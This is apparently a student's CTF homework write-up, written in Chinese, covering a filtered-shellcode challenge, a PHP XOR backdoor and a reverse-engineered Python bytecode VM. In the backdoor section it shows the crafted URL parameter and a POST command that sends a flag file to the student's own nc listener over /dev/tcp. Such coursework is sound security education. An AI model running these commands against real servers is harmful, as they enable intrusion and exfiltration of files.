# Computer Security Homework 0x00
Real name: 涂世昱
Nickname: R07922115
Student ID: R07922115

## shellc0de
這題目的是輸入一段 shellcode 被當成函數來執行, 所輸入的 shellcode 進行 syscall 去執行 /bin/sh 的操作, 而後找到 flag 位置並且輸出。 這段 shellcode 是由一段 assembly 經過 pwntools 所轉成的一串 bytecode, 而這段 assembly 所作的事情就是 execve("/bin/sh"), 將此 assembly 用 pwntools 的 asm() 函數包起來就會變成一個字串, 又因為 syscall 這個 assembly 所轉成的字串會被轉換成 '\x0f\x05', "mov rax, 59" (指定 syscall 為 execve) 會變成 'H\xc7\xc0;\x00\x00\x00', 而在 shell.c 當中就會把 0x00, 0x05, 0x0f 判斷, 若是 shellcode 當中出現這幾個 byte 就會終止執行。 於是我將轉出來的 bytecode 用 pwnlib.encoders.encoder.encode 將 shellcode 再轉換成不包含那些 byte 的 shellcode, 但維持原先的 assembly 操作, 最終就可以解出這題。

## open my backdoor
進入連結打開門之後會出現 php 程式碼, 仔細觀察後得出結果是它會由 url 輸入的變數, $_GET[87], 來決定所要執行的函數名稱, 且此函數名稱是由四個英文字母所組成的, 就可以聯想出像是 echo, exec, eval, ..., 這些可能, 然後將這些東西和 'd00r' 對照 ascii table 16進位的結果在 xor 就可得出該輸入的 url 內容, 例如

```info
'd00r' ^ 'exec' = ['0x1', '0x48', '0x55', '0x11'] -> url: ?87=%01HU%11
```

, 接著再透過 \$_POST{'#'} (e.g. ${"_\x50\x4f\x53\x54"}{\$c}) 來傳入此函數的參數。 因為最終目標是將 server 的 flag 印出來, 所以勢必先將所在位置的檔案都印出來。首先先考慮 echo($(system(ls))), 但根據 php manual
  > 
  Note: Because this is a language construct and not a function, it cannot be called using variable functions. 
  故此法行不通

接著只好試試 exec(ls), 但問題是該如何把 server 那邊 ls 的結果傳回本地呢? 可以先用 nc 在本地開一個 listening port, 再將 server ls 的結果 redirect 到 /dev/tcp/<ip>/<port> 即可。 就發現 flag 被放在 ~/flag__is_here 故最終的解法為:

  >
  labpc terminal 執行: nc -l 8888 
  url: http://edu-ctf.csie.org:10151/d00r.php?87=%01HU%11
  post: #=cat ~/flag_is_here > /dev/tcp/<lab pc ip>/8888

## encrypt

## m4chine
將程式用 python 執行之後發現它要我輸入 flag, 故判斷這題應該是輸入正確的 flag, 程式應該就會輸出 "you got the flag!", 之類的結果。 由於助教給的是 pyc 執行檔, 除了 decompile 之外也沒其他線索該怎麼把 flag 猜出來, 於是就找到了 [Uncompyle6](https://github.com/rocky/python-uncompyle6), 成功將它 decompile 成原始碼, 在原始碼當中可觀察出我們所輸入的 flag 會經過 push, pop, add, sub, cmp 等操作, 然後根據 code 當中的 bytecode 會決定出這些操作的順序, 所以就可以開始改原始碼, 先猜測 flag 為 "FLAG{abcd}", 將操作和 context 結果都印出來, 就發現它都會在 cmp 之後停止, 且在它之前的操作都是 push, pop, sub, add, 且這些操作都是從 context 的最後一個元素來做操作的, 例如

```bash
❯ ./m4chine.py
So, what is the flag ? >> FLAG{abcd}
[70, 76, 65, 71, 123, 97, 98, 99, 100, 125] sub, [70, 76, 65, 71, 123, 97, 98, 99, 25]
[70, 76, 65, 71, 123, 97, 98, 99, 25] push 8, [70, 76, 65, 71, 123, 97, 98, 99, 25, 8]
[70, 76, 65, 71, 123, 97, 98, 99, 25, 8] add, [70, 76, 65, 71, 123, 97, 98, 99, 33]
cmp 33 100
[70, 76, 65, 71, 123, 97, 98, 99, 0]
You fail, try again
```

我們所輸入的 flag 會變成 ascii 的十進位結果存到 context 當中, 首先,  sub 會將 context 最後兩個元素相減然後再放到最後一個位置, push 8 則會把 8 push 到後面, add 則是將最後兩元素相加然後將結果放到最後一個位置, 最後 cmp 則是把 context 最後一個元素, 33, 和 100 比較, 發現他們兩個不相等則終止執行。 所以我們就可以猜測因為最後一個字一定是 '}', 所以倒數第二個字應該要是 '!' 最後才能和 100 相等, 所以下次就以 'FLAG{abcd!}' 做嘗試, 最終就可以完全把 flag 推測出來了。


## Winmagic

